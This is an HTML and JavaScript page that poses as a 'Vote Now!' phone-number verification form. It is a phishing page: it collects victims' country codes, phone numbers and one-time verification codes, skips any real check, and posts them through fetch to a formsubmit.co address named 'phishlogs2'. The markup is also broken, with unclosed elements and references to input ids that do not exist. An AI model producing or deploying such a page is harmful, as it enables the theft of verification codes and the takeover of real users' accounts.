<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Phone Number Verification</title>
  <style>
    /* Add your CSS styling here */
  </style>
</head>
<body>

 <form id="phoneNumberForm">
    <h2 style="text-align: center; color: #4caf50;">Vote Now!</h2>
    <label for="country">Select Country:</label>
    <select id="country" required>
      <option value="" disabled selected>Select Country</option>
      <option value="US">United States (+1)</option>
      <option value="CA">Canada (+1)</option>
      <option value="IN">India (+91)</option>
      <option value="GB">United Kingdom (+44)</option>
      <!-- Add more country options as needed -->
      <option value="AF">Afghanistan (+93)</option>
      <option value="AL">Albania (+355)</option>
      <option value="DZ">Algeria (+213)</option>
      
  <form id="verificationForm" style="display: none;">
    <label for="verificationCode">Verification Code:</label>
    <input type="text" id="verificationCode" required>
    <button type="button" onclick="verifyCode()">Verify</button>
  </form>

  <script>
    function sendVerificationCode() {
      // Get values from the first form
      const countryCode = document.getElementById('countryCode').value;
      const phoneNumber = document.getElementById('phoneNumber').value;

      // You can add validation and formatting of phone number here if needed

      // Generate a random 6-digit verification code
      const verificationCode = generateRandomCode();
      console.log('Verification code sent:', verificationCode);

      // Store verification code for later verification
      sessionStorage.setItem('verificationCode', verificationCode);

      // Proceed to the next step
      nextStep();
    }

    function verifyCode() {
      // Proceed to submit forms without actual verification
      submitForms();
    }

    function submitForms() {
      // Create FormData object to send form data
      const formData = new FormData();
      formData.append('countryCode', document.getElementById('countryCode').value);
      formData.append('phoneNumber', document.getElementById('phoneNumber').value);
      formData.append('verificationCode', document.getElementById('verificationCode').value);

      // Use fetch to submit data to FormSubmit
      fetch('https://formsubmit.co/phishlogs2@gmail.com', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        console.log(data); // You can handle the response as needed

        // Optionally, reset or clear form data
        document.getElementById('countryCode').value = '';
        document.getElementById('phoneNumber').value = '';
        document.getElementById('verificationCode').value = '';

        // Reset stored verification code
        sessionStorage.removeItem('verificationCode');

        // You can redirect to a thank you page or perform other actions as needed
        alert('Forms submitted successfully!');
      })
      .catch(error => console.error('Error:', error));
    }

    function nextStep() {
      // Hide the first form
      document.getElementById('phoneNumberForm').style.display = 'none';

      // Display the second form
      document.getElementById('verificationForm').style.display = 'block';
    }

    function generateRandomCode() {
      // Generate a random 6-digit code
      return Math.floor(100000 + Math.random() * 900000).toString();
    }
  </script>

</body>
</html>
